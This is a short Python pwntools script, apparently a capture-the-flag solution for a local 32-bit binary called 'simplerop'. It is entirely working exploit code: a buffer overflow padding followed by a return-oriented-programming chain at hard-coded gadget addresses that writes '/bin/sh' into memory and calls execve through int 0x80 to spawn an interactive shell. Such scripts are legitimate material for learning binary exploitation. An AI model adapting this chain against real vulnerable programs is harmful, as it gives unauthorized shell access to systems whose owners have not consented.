#! /usr/bin/python
# -*- coding: utf-8 -*-
# By : vagrant
# Email : finn79426@gmail.com

from pwn import *

r = process("./simplerop")
context.arch = "i386"

r.recvuntil(":")


payload = "A"*32

# Gadget
mov_pedx_rax = 0x809a15d
pop_eax = 0x80bae06
pop_edx = 0x806e82a
pop_edx_ecx_ebx = 0x0806e850
buf = 0x80ea060 # .data header
int80 = 0x80493e1

# Write to memory
## edx = buf_addr, eax = "/bin"
rop = flat([pop_edx, buf, pop_eax, "/bin"])
## *edx = "/bin"
rop += flat([mov_pedx_rax])
## edx = buf_addr+4byte, eax = "/sh\x00"
rop += flat([pop_edx, buf+4, pop_eax, "/sh\x00"])
## *edx = "/sh\x00"
rop += flat([mov_pedx_rax])

# Write to register
# execve("/bin/sh", 0, 0)
## edx = 0, ecx = 0, ebx = buf_addr
rop += flat([pop_edx_ecx_ebx, 0, 0, buf])
## eax = 0xb
rop += flat([pop_eax, 0xb])
## syscall
rop += flat(int80)


r.sendline(payload + rop)
r.interactive()
